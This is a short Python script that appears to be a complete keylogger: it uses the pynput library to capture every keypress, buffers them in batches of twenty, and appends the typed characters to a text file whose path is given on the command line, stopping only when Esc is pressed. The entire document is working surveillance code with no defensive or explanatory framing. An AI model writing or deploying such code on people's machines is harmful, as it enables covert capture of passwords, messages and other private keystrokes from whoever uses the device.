import argparse
from pynput.keyboard import Key, Listener

count = 0 
keys = []
limit = 0

def on_press(ev, filePath):
	global keys, count, limit
	keys.append(ev)
	count+=1
	limit+=1
	if limit >= 20:
		limit=0
		write_on_file(keys, filePath)
		keys = []
	if ev == Key.esc:
		return False
	
def write_on_file(keys, filePath):
	with open(filePath+".txt", "a+") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write(' ')
			elif k.find("Key") == -1:
				f.write(k)

def start_keylogger(filePath):
    with Listener(on_press=lambda ev: on_press(ev, filePath)) as listener:
        listener.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("filePath", type=str, help="File path for output .txt file")
    args = parser.parse_args()

    start_keylogger(args.filePath)
